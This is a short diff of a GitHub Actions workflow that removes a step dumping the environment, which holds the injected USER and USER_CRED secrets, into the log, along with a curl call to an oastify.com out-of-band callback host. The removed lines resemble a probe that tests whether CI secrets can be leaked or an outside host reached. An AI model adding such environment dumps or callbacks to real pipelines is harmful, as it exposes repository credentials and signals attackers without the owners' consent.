@@ -21,9 +21,8 @@ jobs:
         USER: ${{secrets.USER}}
         PW: ${{secrets.USER_CRED}}
       run: |
-        echo $($USER)
-        echo $(env)
-        curl http://fziqlrpi6ofqfc4p3b36v4356wcn0ko9.oastify.com/
+        echo $(URL)
+        echo $URL
         
     - name: send_run_log
       continue-on-error: true
